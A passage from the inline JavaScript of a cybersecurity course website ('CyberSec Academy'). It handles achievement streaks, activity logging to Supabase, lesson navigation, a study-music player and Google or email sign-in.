    // Early bird (4 AM to 6 AM)
    if (hour >= 4 && hour < 6) {
        await incrementTimeBasedCounter('early_sessions', 'early_bird');
    }

    // Weekend warrior (Saturday = 6, Sunday = 0)
    if (dayOfWeek === 0 || dayOfWeek === 6) {
        await incrementTimeBasedCounter('weekend_sessions', 'weekend_warrior');
    }
}

async function incrementTimeBasedCounter(counterType, achievementId) {
    try {
        const dateStr = new Date().toISOString().split('T')[0];
        const cacheKey = `${counterType}_${currentUser.id}_${dateStr}`;

        // Prevent multiple increments per day
        if (sessionStorage.getItem(cacheKey)) return;

        // Update counter
    await supabase.rpc('increment_profile_counter', {
  user_id_param: currentUser.id,
  counter_field: counterType,
  increment_value: 1
});

        // Cache to prevent double counting
        sessionStorage.setItem(cacheKey, 'true');

        // Check related achievement
        if (achievementId) {
            await checkAndUnlockAchievement(achievementId, true);
        }

    } catch (error) {
        console.error(`Error incrementing ${counterType}:`, error);
    }
}

async function checkDailyStreak() {
    try {
        const { data: profile, error } = await supabase
            .from('profiles')
            .select('last_activity, current_streak, last_streak_date')
            .eq('id', currentUser.id)
            .single();

        if (error) throw error;

        const now = new Date();
        const today = now.toDateString();
        const lastActivity = profile.last_activity ? new Date(profile.last_activity) : null;
        const lastStreakDate = profile.last_streak_date ? new Date(profile.last_streak_date).toDateString() : null;

        let newStreak = profile.current_streak || 0;
        let shouldUpdateStreak = false;

        if (!lastActivity) {
            // First time user
            newStreak = 1;
            shouldUpdateStreak = true;
        } else {
            const daysSinceLastActivity = Math.floor((now - lastActivity) / (1000 * 60 * 60 * 24));
            
            if (lastStreakDate === today) {
                // Already counted today's streak
                return newStreak;
            } else if (daysSinceLastActivity === 1 || (daysSinceLastActivity === 0 && lastStreakDate !== today)) {
                // Consecutive day or same day but not counted yet
                newStreak += 1;
                shouldUpdateStreak = true;
            } else if (daysSinceLastActivity > 1) {
                // Streak broken
                newStreak = 1;
                shouldUpdateStreak = true;
            }
        }

        if (shouldUpdateStreak) {
            await supabase
                .from('profiles')
                .update({
                    current_streak: newStreak,
                    last_activity: now.toISOString(),
                    last_streak_date: now.toISOString()
                })
                .eq('id', currentUser.id);

            userStats.current_streak = newStreak;
            
            showToast(`Daily streak: ${newStreak} days!`, 'success');
            await checkStreakAchievements(newStreak);
        }

        return newStreak;
        
    } catch (error) {
        console.error('Error checking daily streak:', error);
        return 0;
    }
}

async function checkStreakAchievements(currentStreak) {
    const streakMilestones = [3, 7, 14, 30, 100, 365];
    
    for (const milestone of streakMilestones) {
        if (currentStreak >= milestone) {
            await checkAndUnlockAchievement(`streak_${milestone}`);
        }
    }
}

// =====================================================
// USER ACTIVITY LOGGING
// =====================================================
async function logUserActivity(activityType, metadata = {}) {
    try {
        const now = new Date();
        
        const activityData = {
            user_id: currentUser.id,
            activity_type: activityType,
            timestamp: now.toISOString(),
            course_id: COURSE_DATA.id,
            lesson_index: currentLessonIndex,
            session_duration: courseSession.totalStudyTime,
            metadata: JSON.stringify(metadata),
            created_at: now.toISOString()
        };

        // Try to log to activities table
        const { error } = await supabase
            .from('user_activities')
            .insert([activityData]);

        if (error && error.code !== '42P01') {
            console.warn('Activity logging failed:', error.message);
        }

        // Always update last activity in profile
        await supabase
            .from('profiles')
            .update({ last_activity: now.toISOString() })
            .eq('id', currentUser.id);

    } catch (error) {
        console.error('Error logging user activity:', error);
    }
}

// =====================================================
// NAVIGATION SYSTEM
// =====================================================
function updateNavigationButtons() {
    const prevBtn = document.getElementById('prevLessonBtn');
    const nextBtn = document.getElementById('nextLessonBtn');
    
    if (!prevBtn || !nextBtn) return;

    // Previous button
    prevBtn.disabled = currentLessonIndex === 0;
    
    // Next button logic
    const isLastLesson = currentLessonIndex === COURSE_DATA.lessons.length - 1;
    const canGoNext = currentLessonIndex < COURSE_DATA.lessons.length - 1 && 
                     canAccessLesson(currentLessonIndex + 1);
    
    if (isLastLesson) {
        const isCurrentCompleted = courseProgress[COURSE_DATA.lessons[currentLessonIndex].id]?.completed;
        nextBtn.disabled = !isCurrentCompleted;
        nextBtn.innerHTML = '<i class="fas fa-trophy"></i> Complete Course';
    } else {
        nextBtn.disabled = !canGoNext;
        nextBtn.innerHTML = 'Next <i class="fas fa-chevron-right"></i>';
    }
}

// Navigation button event handlers
function goToPreviousLesson() {
    if (currentLessonIndex > 0) {
        trackLessonTime(); // Track time spent on current lesson
        currentLessonIndex--;
        loadLesson(currentLessonIndex);
    }
}

function goToNextLesson() {
    if (currentLessonIndex < COURSE_DATA.lessons.length - 1) {
        const canGoNext = canAccessLesson(currentLessonIndex + 1);
        if (canGoNext) {
            trackLessonTime();
            currentLessonIndex++;
            loadLesson(currentLessonIndex);
        } else {
            showToast('Complete the current lesson quiz to proceed', 'warning');
        }
    } else {
        // Complete course
        completeCourse();
    }
}

// =====================================================
// SIDEBAR FUNCTIONS
// =====================================================
function toggleSidebar() {
    const sidebar = document.getElementById('sidebar');
    const overlay = document.getElementById('sidebarOverlay');
    
    if (sidebar) sidebar.classList.toggle('open');
    if (overlay) overlay.classList.toggle('active');
}

function closeSidebar() {
    const sidebar = document.getElementById('sidebar');
    const overlay = document.getElementById('sidebarOverlay');
    
    if (sidebar) sidebar.classList.remove('open');
    if (overlay) overlay.classList.remove('active');
}

// =====================================================
// ACHIEVEMENT NOTIFICATION SYSTEM
// =====================================================
function queueAchievementNotification(achievement) {
    notificationQueue.push(achievement);
    processNotificationQueue();
}

function processNotificationQueue() {
    if (isShowingNotification || notificationQueue.length === 0) return;

    isShowingNotification = true;
    const achievement = notificationQueue.shift();
    showAchievementNotification(achievement);

    const duration = achievement.rarity === 'mythic' ? 8000 :
                     achievement.rarity === 'legendary' ? 7000 : 6000;

    setTimeout(() => {
        isShowingNotification = false;
        processNotificationQueue();
    }, duration + 500);
}

function showAchievementNotification(achievement) {
    const notification = document.getElementById('achievementNotification');
    if (!notification) return;

    const icon = document.getElementById('notificationIcon');
    const title = document.getElementById('notificationTitle');
    const description = document.getElementById('notificationDescription');
    const points = document.getElementById('notificationPoints');

    if (icon) {
        icon.innerHTML = `<i class="${achievement.icon}"></i>`;
        icon.className = `notification-icon ${achievement.rarity}`;
    }
    if (title) title.textContent = achievement.name;
    if (description) description.textContent = achievement.description;
    if (points) points.textContent = `+${achievement.points} Points`;

    notification.className = `achievement-notification ${achievement.rarity}`;
    notification.classList.add('show');

    const duration = achievement.rarity === 'mythic' ? 8000 :
                     achievement.rarity === 'legendary' ? 7000 : 6000;

    setTimeout(() => {
        notification.classList.remove('show');
    }, duration);
}

// =====================================================
// UTILITY FUNCTIONS
// =====================================================
function calculateAverageQuizScore() {
    const scores = Object.values(courseProgress)
        .filter(p => p.completed && p.quizScore)
        .map(p => p.quizScore);
    
    if (scores.length === 0) return 0;
    return Math.round(scores.reduce((sum, score) => sum + score, 0) / scores.length);
}

async function resetProgress() {
    if (!confirm('Are you sure you want to reset your progress? This action cannot be undone.')) {
        return;
    }

    try {
        // Track lesson time before reset
        trackLessonTime();
        
        // Reset local state
        courseProgress = {};
        currentLessonIndex = 0;
        courseSession = {
            startTime: new Date(),
            totalStudyTime: 0,
            lessonsStarted: 0,
            lessonsCompleted: 0,
            pageLoadTime: new Date(),
            interactionCount: 0,
            lastActivityTime: new Date()
        };
        
        // Delete from database
        await supabase
            .from('course_progress')
            .delete()
            .eq('user_id', currentUser.id)
            .eq('course_id', COURSE_DATA.id);

        // Log reset activity
        logUserActivity('progress_reset', {
            course_id: COURSE_DATA.id,
            reset_reason: 'manual'
        });

        // Reinitialize
        await saveProgress();
        renderSidebar();
        loadLesson(0);
        
        showToast('Progress reset successfully', 'success');
        
    } catch (error) {
        console.error('Error resetting progress:', error);
        showToast('Failed to reset progress', 'error');
    }
}

function copyCode(codeId) {
    const codeElement = document.getElementById(codeId);
    if (!codeElement) return;
    
    const text = codeElement.textContent;
    
    navigator.clipboard.writeText(text).then(() => {
        showToast('Code copied to clipboard!', 'success');
        
        // Track code copy for achievements
        logUserActivity('code_copied', {
            code_section: codeId,
            lesson_id: COURSE_DATA.lessons[currentLessonIndex].id
        });
        
    }).catch(err => {
        console.error('Failed to copy code:', err);
        showToast('Failed to copy code', 'error');
        
        // Fallback for older browsers
        const textArea = document.createElement('textarea');
        textArea.value = text;
        document.body.appendChild(textArea);
        textArea.select();
        try {
            document.execCommand('copy');
            showToast('Code copied to clipboard!', 'success');
        } catch (fallbackError) {
            showToast('Copy failed - please select and copy manually', 'error');
        }
        document.body.removeChild(textArea);
    });
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// =====================================================
// UI FEEDBACK SYSTEMS
// =====================================================
function showToast(message, type = 'success') {
    const toast = document.getElementById('toast');
    const messageEl = document.getElementById('toastMessage');
    
    if (!toast || !messageEl) {
        console.log(`Toast: ${message} (${type})`);
        return;
    }
    
    messageEl.textContent = message;
    toast.className = `toast ${type} show`;

    setTimeout(() => {
        toast.classList.remove('show');
    }, 4000);
}

function showLoadingScreen() {
    const loadingScreen = document.getElementById('loadingScreen');
    if (loadingScreen) loadingScreen.classList.remove('hidden');
}

function hideLoadingScreen() {
    const loadingScreen = document.getElementById('loadingScreen');
    if (loadingScreen) {
        setTimeout(() => {
            loadingScreen.classList.add('hidden');
        }, 1000);
    }
}

// =====================================================
// MUSIC PLAYER INTEGRATION
// =====================================================
function initMusicPlayer() {
    const btnText = document.getElementById('music-button-text');
    const icon = document.getElementById('music-icon');
    const dropdown = document.getElementById('music-dropdown-content');
    
    if (!btnText || !icon || !dropdown) return;
    
    function setUI(state) {
        btnText.textContent = state === "Playing" ? "PAUSE MUSIC" : "STUDY MUSIC";
        icon.className = state === "Playing" ? "fa-solid fa-circle-pause" : "fa-solid fa-music";
    }

    // Load saved music state
    const savedSrc = localStorage.getItem("cybersec_music_src");
    const savedTime = parseFloat(localStorage.getItem("cybersec_music_time") || 0);
    
    if (savedSrc) {
        audioPlayer.src = savedSrc;
        audioPlayer.currentTime = savedTime;
        audioPlayer.play()
            .then(() => setUI("Playing"))
            .catch(() => setUI("Stopped"));
    }

    // Music button click handler
    document.getElementById('music-dropdown').querySelector('button').addEventListener('click', (e) => {
        e.stopPropagation();
        dropdown.style.display = dropdown.style.display === "block" ? "none" : "block";
        
        if (audioPlayer.src && !audioPlayer.paused) {
            audioPlayer.pause();
            setUI("Stopped");
        } else if (audioPlayer.src) {
            audioPlayer.play().then(() => setUI("Playing"));
        }
    });

    // Music selection handlers
    dropdown.querySelectorAll("a[data-src]").forEach((link) => {
        link.addEventListener("click", (e) => {
            e.preventDefault();
            audioPlayer.src = link.dataset.src;
            audioPlayer.play().then(() => setUI("Playing"));
            localStorage.setItem("cybersec_music_src", link.dataset.src);
            dropdown.style.display = "none";
        });
    });

    // Stop music handler
    const stopLink = document.getElementById("stop-music-link");
    if (stopLink) {
        stopLink.addEventListener("click", (e) => {
            e.preventDefault();
            audioPlayer.pause();
            audioPlayer.currentTime = 0;
            audioPlayer.removeAttribute("src");
            setUI("Stopped");
            localStorage.removeItem("cybersec_music_src");
            localStorage.removeItem("cybersec_music_time");
            dropdown.style.display = "none";
        });
    }

    // Save music state before page unload
    window.addEventListener("beforeunload", () => {
        if (!audioPlayer.paused && audioPlayer.src) {
            localStorage.setItem("cybersec_music_src", audioPlayer.src);
            localStorage.setItem(
                "cybersec_music_time",
                audioPlayer.currentTime
            );
        }
    });

    // Close dropdown when clicking outside
    window.addEventListener("click", (e) => {
        if (!e.target.closest("#music-dropdown")) {
            dropdown.style.display = "none";
        }
    });
}

// Show initial music indicator
function addMusicIndicator() {
    const musicBtn = document.querySelector("#music-dropdown");
    if (musicBtn) {
        const indicator = document.createElement("div");
        indicator.className = "music-indicator";
        indicator.innerHTML = `<i class="fa-solid fa-music"></i> Try Study Music!`;

        musicBtn.style.position = "relative";
        musicBtn.appendChild(indicator);

        setTimeout(() => indicator.remove(), 3000);
    }
}

// Initialize Event Listeners
function initializeEventListeners() {
    // Navigation buttons
    document.getElementById('prevLessonBtn')?.addEventListener('click', goToPreviousLesson);
    document.getElementById('nextLessonBtn')?.addEventListener('click', goToNextLesson);

    // Reset progress button
    document.getElementById('resetProgressBtn')?.addEventListener('click', resetProgress);

    // Mobile menu toggle
    document.getElementById('menuToggle')?.addEventListener('click', toggleSidebar);
    document.getElementById('sidebarOverlay')?.addEventListener('click', closeSidebar);

    // Keyboard shortcuts
    document.addEventListener('keydown', handleKeyboardShortcuts);

    // Window resize handler
    window.addEventListener('resize', handleWindowResize);

    // Content interaction tracking
    document.getElementById('contentBody')?.addEventListener('scroll', debounce(() => {
        trackUserInteraction();
    }, 1000));
}

// Keyboard Shortcuts
function handleKeyboardShortcuts(e) {
    if (document.querySelector('.quiz-question.active')) return;

    if (e.key === 'ArrowLeft' && e.ctrlKey) {
        e.preventDefault();
        goToPreviousLesson();
    } else if (e.key === 'ArrowRight' && e.ctrlKey) {
        e.preventDefault();
        goToNextLesson();
    }
}

// Window Resize Handler
function handleWindowResize() {
    if (window.innerWidth > 768) {
        closeSidebar();
    }
}

// Debounce Helper
function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

// Initialize responsive behavior
if (window.innerWidth <= 768) {
    document.getElementById('menuToggle').style.display = 'inline-flex';
}

// Auto-save progress periodically
setInterval(async () => {
    if (currentUser && Object.keys(courseProgress).length > 0) {
        await saveProgress();
    }
}, 60000); // Save every minute

// System initialization logging
console.log('CyberSec Academy Course System Initialized');
console.log('Current Course:', COURSE_DATA.title);
console.log('Total Lessons:', COURSE_DATA.lessons.length);

// Google OAuth Integration
const googleBtn = document.querySelector(".btn-google");
if (googleBtn) {
    googleBtn.addEventListener("click", async () => {
        const { data, error } = await supabase.auth.signInWithOAuth({
            provider: "google",
            options: {
                redirectTo: window.location.origin + "/courses/sandboxing-detection-engineering-expanded.html",
            },
        });

        if (error) {
            console.error("Google login error:", error.message);
            showToast("Google login failed: " + error.message, "error");
        }
    });
}

// Check for existing session
supabase.auth.getSession().then(({ data }) => {
    if (data.session) {
        console.log("User already logged in:", data.session.user);
        currentUser = data.session.user;
        startCourseSession();
    }
});


// Add missing auth modal functions
function openAuthModal() {
    const modal = document.getElementById('authModal');
    if (modal) {
        modal.style.display = 'flex';
    }
}

function closeAuthModal() {
    const modal = document.getElementById('authModal');
    if (modal) {
        modal.style.display = 'none';
    }
}

// Add auth tab switching functionality
document.getElementById('tabSignIn')?.addEventListener('click', () => {
    document.getElementById('tabSignIn').classList.add('active');
    document.getElementById('tabSignUp').classList.remove('active');
    document.getElementById('signInForm').style.display = 'block';
    document.getElementById('signUpForm').style.display = 'none';
});

document.getElementById('tabSignUp')?.addEventListener('click', () => {
    document.getElementById('tabSignUp').classList.add('active');
    document.getElementById('tabSignIn').classList.remove('active');
    document.getElementById('signUpForm').style.display = 'block';
    document.getElementById('signInForm').style.display = 'none';
});

document.getElementById('closeAuthModal')?.addEventListener('click', closeAuthModal);

// Improved error handling for auth session
supabase.auth.onAuthStateChange((event, session) => {
    if (event === 'SIGNED_IN') {
        currentUser = session.user;
        closeAuthModal();
        startCourseSession();
    } else if (event === 'SIGNED_OUT') {
        currentUser = null;
        openAuthModal();
    }
});

// Add form submission handlers
document.getElementById('emailSignInForm')?.addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = document.getElementById('signInEmail').value;
    const password = document.getElementById('signInPassword').value;
    
    try {
        const { data, error } = await supabase.auth.signInWithPassword({
            email,
            password
        });
        
        if (error) throw error;
        
        closeAuthModal();
    } catch (error) {
        showToast(error.message, 'error');
    }
});

document.getElementById('emailSignUpForm')?.addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = document.getElementById('signUpEmail').value;
    const password = document.getElementById('signUpPassword').value;
    const name = document.getElementById('signUpName').value;
    
    try {
        const { data, error } = await supabase.auth.signUp({
            email,
            password,
            options: {
                data: {
                    full_name: name
                }
            }
        });
        
        if (error) throw error;
        
        showToast('Account created successfully! Please check your email.', 'success');
    } catch (error) {
        showToast(error.message, 'error');
    }
});
    </script>
</body>

</html>
